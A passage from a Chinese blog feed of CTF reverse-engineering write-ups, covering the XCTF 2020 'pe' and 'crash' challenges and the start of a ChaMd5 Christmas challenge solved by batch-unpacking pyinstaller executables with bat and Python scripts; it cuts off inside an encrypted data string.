j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        anEx=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">            anEx+=<span class="built_in">str</span>(rand[j*<span class="number">42</span>+k])+<span class="string">&quot;*&quot;</span>+var[k]+<span class="string">&quot;+&quot;</span></span><br><span class="line">        anEx=anEx[:<span class="number">-1</span>]+<span class="string">&quot;-&quot;</span>+<span class="built_in">str</span>(data[j])</span><br><span class="line">        exper.append(anEx)</span><br><span class="line">    res=solve(exper,var)</span><br><span class="line">    print(<span class="built_in">str</span>(i)+<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    print(res.values())</span><br></pre></td></tr></table></figure><p>爆破得到：</p><p><img src="/p/wpFor-2020XCTF/image-20201228135416441.png"></p><p>可知key是82，而v9在xor以后的数组也爆出来了，简单xor得flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arr=[<span class="number">0xA0</span>, <span class="number">0xE4</span>, <span class="number">0xBA</span>, <span class="number">0xFB</span>, <span class="number">0x10</span>, <span class="number">0xDD</span>, <span class="number">0xAC</span>, <span class="number">0x65</span>, <span class="number">0x8D</span>, <span class="number">0x0B</span>, <span class="number">0x57</span>, <span class="number">0x1A</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x96</span>, <span class="number">0xB3</span>, <span class="number">0x0C</span>, <span class="number">0x79</span>, <span class="number">0x4D</span>, <span class="number">0x80</span>, <span class="number">0x90</span>, <span class="number">0x99</span>, <span class="number">0x58</span>, <span class="number">0xFE</span>, <span class="number">0x50</span>, <span class="number">0xD3</span>, <span class="number">0xF9</span>, <span class="number">0x3C</span>, <span class="number">0x0F</span>, <span class="number">0xC1</span>, <span class="number">0xE3</span>, <span class="number">0xA6</span>, <span class="number">0x39</span>, <span class="number">0xC3</span>, <span class="number">0x28</span>, <span class="number">0x75</span>, <span class="number">0xF8</span>, <span class="number">0xC9</span>, <span class="number">0xC8</span>, <span class="number">0xCD</span>, <span class="number">0x78</span>, <span class="number">0x26</span>]</span><br><span class="line">x=[<span class="number">198</span>, <span class="number">136</span>, <span class="number">219</span>, <span class="number">156</span>, <span class="number">107</span>, <span class="number">228</span>, <span class="number">152</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">63</span>, <span class="number">97</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">5</span>, <span class="number">247</span>, <span class="number">131</span>, <span class="number">109</span>, <span class="number">75</span>, <span class="number">96</span>, <span class="number">180</span>, <span class="number">241</span>, <span class="number">173</span>, <span class="number">57</span>, <span class="number">211</span>, <span class="number">49</span>, <span class="number">224</span>, <span class="number">157</span>, <span class="number">9</span>, <span class="number">34</span>, <span class="number">243</span>, <span class="number">129</span>, <span class="number">199</span>, <span class="number">1</span>, <span class="number">244</span>, <span class="number">31</span>, <span class="number">17</span>, <span class="number">157</span>, <span class="number">171</span>, <span class="number">252</span>, <span class="number">249</span>, <span class="number">64</span>, <span class="number">91</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(x[i]^arr[i])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2020XCTF/image-20201230002706300.png"></p><p><strong>flag{94bb46eb-a0a2-4a4a-a3d5-2ba877deb448}</strong></p><h2 id="pe"><a href="#pe" class="headerlink" title="pe"></a>pe</h2><p>arm架构，没环境调不动，只能硬看了XD。这题有好多奇怪的函数，而且通过伪代码跟的话就能看到函数套函数套函数……所以基本靠猜出来的（</p><p>继续通过字符串回溯找主函数。</p><p><img src="/p/wpFor-2020XCTF/image-20201230004038936.png"></p><p><img src="/p/wpFor-2020XCTF/image-20201230004436275.png"></p><p>根据参数猜测，sub_1400023C8()是strcmp()的作用，我们需要让v9&#x3D;”KIMLXDWRZXTHXTHQTXTXHZWC”。</p><p>再往上走，sub_1400015B0这个函数调用了v9，于是跟进去看功能。</p><p><img src="/p/wpFor-2020XCTF/image-20201230085247002.png"></p><p>感觉是某种加密，以相邻的两字符为一组，对这两个字符做相同的操作，再做后续处理。</p><p>跟进sub_1400012B8()里看，可以看到大概是一个搜索的过程</p><p><img src="/p/wpFor-2020XCTF/image-20201230122448387.png"></p><p>如果不等于-1就说明在表中找到了这个元素，然后返回一个索引（？</p><p>再往下看好像就看不太懂了，然后就是玄学的猜猜猜&#x3D; &#x3D;</p><p>回去看string可以看到一个这个，猜测是密钥表之类的？</p><p><img src="/p/wpFor-2020XCTF/image-20201230123304290.png"></p><p>往上回溯也看不到什么线索，不过可以发现这25个数字刚好没有相同的。</p><p>现在总结一下这个古典加密算法的特点，大概是两个为一组处理+已定义的密钥表（即不是通过输入生成的）5*5+处理时用到索引。</p><p><del>很久很久以前想写某对cp的AU同人时想把ctf元素混进去，就看了很多简单又奇奇怪怪的编码&#x2F;古典密码（现代密码太学术了XD），没想到现在有用武之地了（手动狗头。</del></p><blockquote><p>安利一个编码&#x2F;古典密码的集合：<a href="https://www.cnblogs.com/mq0036/p/6544055.html">CTF中那些脑洞大开的编码和加密 - jack_Meng - 博客园</a></p></blockquote><p>然后翻到了一个符合这个特点的密码，Playfair Cipher：</p><p><img src="/p/wpFor-2020XCTF/image-20201230124909385.png"></p><p>不同的是密码表是直接给出的，不过加密流程再对回ida里的反编译感觉挺像的，于是果断试试。</p><p>按照Playfair Cipher的加解密流程写出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIndex</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">        <span class="keyword">if</span> key[i].find(c)!=<span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> i,key[i].find(c)</span><br><span class="line">letter_list=<span class="string">&quot;ABCDEFGHJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">key=[<span class="string">&quot;CREIH&quot;</span>,<span class="string">&quot;TQGNU&quot;</span>,<span class="string">&quot;AOVXL&quot;</span>,<span class="string">&quot;DZKYM&quot;</span>,<span class="string">&quot;PBWFS&quot;</span>]</span><br><span class="line">cipher=<span class="string">&quot;KIMLXDWRZXTHXTHQTXTXHZWC&quot;</span></span><br><span class="line">text=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(cipher),<span class="number">2</span>):</span><br><span class="line">    j=i+<span class="number">1</span></span><br><span class="line">    x1,y1=getIndex(cipher[i])</span><br><span class="line">    x2,y2=getIndex(cipher[j])</span><br><span class="line">    <span class="keyword">if</span> x1==x2:</span><br><span class="line">        text+=key[x1][(y1+<span class="number">1</span>)%<span class="number">5</span>]+key[x2][(y2+<span class="number">1</span>)%<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">elif</span> y1==y2:</span><br><span class="line">        text+=key[(x1+<span class="number">1</span>)%<span class="number">5</span>][y1]+key[(x2+<span class="number">1</span>)%<span class="number">5</span>][y2]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text+=key[x1][y2]+key[x2][y1]</span><br><span class="line">print(text)</span><br></pre></td></tr></table></figure><p>走一遍脚本解密可以得到：</p><p><img src="/p/wpFor-2020XCTF/image-20201230132557395.png"></p><p>YES MAYBE YOU CAN RUN AN ARM PE</p><p><del>No, I can’t :(</del></p><p>看起来能读的通，成功get flag。</p><p><strong>flag{YESMAYBEYOUCANRUNANARMPE}</strong></p><h2 id="crash"><a href="#crash" class="headerlink" title="crash"></a>crash</h2><p>用binwalk分析给的crash文件</p><p><img src="/p/wpFor-2020XCTF/image-20210203135834833.png"></p><p>可以看到0x1000处有一个<code> ELF, 32-bit LSB executable</code>，先把这个可执行文件用dd分离出来。</p><p><img src="/p/wpFor-2020XCTF/image-20210203135922549.png"></p><p>其中if&#x3D;输入文件名（被分离的），of&#x3D;输出文件名（分离出来的），skip&#x3D;跳过的块（bs指定字节）数，count&#x3D;块长度，最后得到<code>file_0x1000</code>文件。</p><p>用ida打开如果出现这个warning，可以用 <a href="https://github.com/Reinose/Useful-IDAScripts/tree/87596d4f2cb6fb56a3796e93619c9e64bb648301/PatchPLT">Reinose&#x2F;Useful-IDAScripts</a> 的方法解决。</p><p><img src="/p/wpFor-2020XCTF/image-20210203140139308.png"></p><p>老样子，通过<code>shift+F12</code>寻找字符串，通过交叉引用找到主函数。</p><p><img src="/p/wpFor-2020XCTF/image-20210203140825026.png"></p><p>先通过一些参数和常用逻辑的猜测给系统函数命名，方便后续分析。</p><p><img src="/p/wpFor-2020XCTF/image-20210203141153998.png"></p><p>然后就剩<code>sub_8048737()</code>和<code>sub_80487E7</code>这两个加密函数了。</p><p><img src="/p/wpFor-2020XCTF/image-20210203141241346.png"></p><p><img src="/p/wpFor-2020XCTF/image-20210203141308404.png"></p><p>第一个就很简单啦，简单xor。</p><p>第二个点进<code>sub_80489E9()</code>可以看到md5经典常数，说明这一系列大概是个md5加密（当然md5的实现还是要看看的。</p><p><img src="/p/wpFor-2020XCTF/image-20210203143123837.png"></p><p>退回去，看到<code>0x804B060</code>这里，很像数组的始地址。</p><p><img src="/p/wpFor-2020XCTF/image-20210203143333398.png"></p><p>于是转到IDA View，按<code>G</code>跳到这个地址，可以看到一堆可见字符，按<code>A</code>转成字符串。</p><p><img src="/p/wpFor-2020XCTF/image-20210203143531099.png"></p><p><img src="/p/wpFor-2020XCTF/image-20210203143612250.png"></p><p>再对回去逻辑就很明显了，就是依次取四个字符进行md5加密，然后跟这八个字符串比。</p><p>于是exp就可以写啦，爆破md5：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">dst=[<span class="string">&#x27;bf2b36d56f5757c13cad80494b385e78&#x27;</span>,<span class="string">&#x27;3fe9dbae5dc4408350500affa20074aa&#x27;</span>,<span class="string">&#x27;1fa6770eca6b57e47a042ffe52eca8ff&#x27;</span>,<span class="string">&#x27;1aad6b7da1122b4b5a53bf5a4d3b11b0&#x27;</span>,<span class="string">&#x27;e7b77d9e0ab19fc9ea98154f994fccc5&#x27;</span>,<span class="string">&#x27;75d9128cfeb61b8949664f6a067f6469&#x27;</span>,<span class="string">&#x27;d8b0a52c64d6075017b7346140550c46&#x27;</span>,<span class="string">&#x27;306529c7cdedfb06e27b39f7b2babf4d&#x27;</span>]</span><br><span class="line">res=[]</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">                l=[a^<span class="number">0x17</span>,b^<span class="number">0x17</span>,c^<span class="number">0x17</span>,d^<span class="number">0x17</span>]</span><br><span class="line">                tmp=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>,l)))</span><br><span class="line">                tmpmd5=md5(tmp).hexdigest()</span><br><span class="line">                <span class="keyword">if</span> tmpmd5 <span class="keyword">in</span> dst:</span><br><span class="line">                    s=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>,[a,b,c,d])))</span><br><span class="line">                    res.append((dst.index(tmpmd5),s))</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(res)==<span class="number">8</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">res.sort(key=(<span class="keyword">lambda</span> x:x[<span class="number">0</span>]))</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span>.join([x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> res])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src="/p/wpFor-2020XCTF/image-20210203145808703.png"></p><p><strong>flag{ux1cy1x4iltkahbc9nu1nk00d9akpp7w}</strong></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2020ChaMd5圣诞题</title>
      <link href="p/wpFor-2020chamd5XMAS/"/>
      <url>p/wpFor-2020chamd5XMAS/</url>
      
        <content type="html"><![CDATA[<p>圣诞莫得安排于是跑去做了一下ChaMd5的圣诞题，不得不说让我这个逆向手很有做misc的成就感哈哈哈（误）。既然活动都结束了就来放一下wp吧，顺便整理一下批量处理文件的方法（pyinstaller批量解包+批量补文件头转格式+python和命令行的批量自动交互）。</p><a id="more"></a><blockquote><p>题目指路：<a href="https://mp.weixin.qq.com/s/efOEkopkhagzmBQ0fuQdqA">快打开你的2020圣诞礼物！ -  ChaMd5安全团队</a></p></blockquote><h1 id="So…begin"><a href="#So…begin" class="headerlink" title="So…begin!"></a>So…begin!</h1><p>下载题目压缩包，解压可以看到有59个exe。</p><p>（好家伙，这是考批量处理文件吧&#x3D; &#x3D;不得不说图标还挺好看的，费心了</p><p><img src="/p/wpFor-2020chamd5XMAS/image-20201228195304783.png"></p><p>不过看到自定义图标，逆向人第一个就想到了这些是用pyinstaller打包的exe啦。虽然也有可能是MFC，不过这里明显不是。</p><p>随便拖一个exe进ida，查看字符串看到有很多“py”字样，很明显就是pyinstaller这条路。</p><p><img src="/p/wpFor-2020chamd5XMAS/image-20201225233254210.png"></p><p>所以果断走流程解包（单个文件处理可以看-&gt;<a href="https://c10udlnk.top/p/reSkillsOn-Pyinstaller-extracted-to-python/">RE套路 - 关于pyinstaller打包文件的复原 | c10udlnk_Log</a>，这里不细讲了，重点在多文件的批量处理）。</p><h1 id="bat批量应用python脚本"><a href="#bat批量应用python脚本" class="headerlink" title="bat批量应用python脚本"></a>bat批量应用python脚本</h1><p>这里写bat脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> %%i <span class="keyword">in</span> (*) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">echo</span> %%i</span><br><span class="line">    python2 pyinstxtractor.py %%i</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>(*)指当前目录，%%i就像平时用的for(int i&#x3D;0;……)的那个i一样是个变量，echo是为了看处理到哪个文件了。</p><p>处理结束后得到59个解压文件包</p><p><img src="/p/wpFor-2020chamd5XMAS/image-20201225233445463.png"></p><h1 id="python批量提取"><a href="#python批量提取" class="headerlink" title="python批量提取"></a>python批量提取</h1><p>然后继续写脚本（这次用python，因为bat实在是不熟）把文件夹里的无后缀文件提取出来，复制到manyPYC文件夹下，方便后续处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line">src=<span class="string">&#x27;./&#x27;</span></span><br><span class="line">dst=<span class="string">&#x27;../manyPYC/&#x27;</span></span><br><span class="line">allFile=os.listdir(src)</span><br><span class="line">pattern=<span class="string">r&#x27;^[0-9]+$&#x27;</span></span><br><span class="line"><span class="keyword">for</span> fileName <span class="keyword">in</span> allFile:</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(fileName):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(fileName):</span><br><span class="line">            <span class="keyword">if</span> re.match(pattern,file)!=<span class="literal">None</span>:</span><br><span class="line">                num=file</span><br><span class="line">                shutil.copy(src+fileName+<span class="string">&#x27;/&#x27;</span>+file,dst+num)</span><br><span class="line">            <span class="keyword">if</span> file==<span class="string">&#x27;struct&#x27;</span>:</span><br><span class="line">                shutil.copy(src+fileName+<span class="string">&#x27;/&#x27;</span>+file,dst+num+<span class="string">&#x27;_struct&#x27;</span>)</span><br></pre></td></tr></table></figure><p>一般是两个有用的，一个是struct，另一个文件名在entry point里会提到，一般是跟exe同名的，不过这里不一样（是数字。</p><p>另外这里线性扫描一定是先扫到以数字命名的文件再到同目录下的struct文件，所以不用担心num未定义的问题。</p><h1 id="python批量补头修复pyc"><a href="#python批量补头修复pyc" class="headerlink" title="python批量补头修复pyc"></a>python批量补头修复pyc</h1><p>根据uncompyle的反编译规则，批量添加magic number，并输出.pyc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">src=<span class="string">&#x27;.&#x27;</span></span><br><span class="line">allFile=os.listdir(src)</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> allFile:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;struct&#x27;</span> <span class="keyword">in</span> file:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            magic=f.read(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file[:<span class="number">-7</span>],<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            context=f.read()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file[:<span class="number">-7</span>]+<span class="string">&#x27;.pyc&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(magic)</span><br><span class="line">            f.write(context)</span><br></pre></td></tr></table></figure><p>提取struct的前八个字节补到同名文件里去，并改名为.pyc。</p><p>注意：这里提前用010Editor看了一下以数字命名的文件和struct是差八个字节，有点特殊。</p><h1 id="bat批量应用指令"><a href="#bat批量应用指令" class="headerlink" title="bat批量应用指令"></a>bat批量应用指令</h1><p>然后写bat脚本执行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> %%i <span class="keyword">in</span> (*) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">echo</span> %%i</span><br><span class="line">    uncompyle6 %%i &gt; %%i.py</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>得到59个python文件。</p><p>这里其实是出来像<code>1.pyc.py</code>这样的文件，有强迫症的朋友（比如我）可以写个脚本把中间的.pyc去掉hhh。</p><h1 id="python和命令行的批量自动交互"><a href="#python和命令行的批量自动交互" class="headerlink" title="python和命令行的批量自动交互"></a>python和命令行的批量自动交互</h1><p>随便查看一个（比如<code>1.py</code>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">data, password</span>):</span></span><br><span class="line">    bs = AES.block_size</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt;= bs:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[<span class="number">0</span>:-<span class="built_in">ord</span>(s[(<span class="number">-1</span>)])]</span><br><span class="line">    iv = data[:bs]</span><br><span class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">    data = unpad(cipher.decrypt(data[bs:]))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">encrypt_data = <span class="string">&#x27;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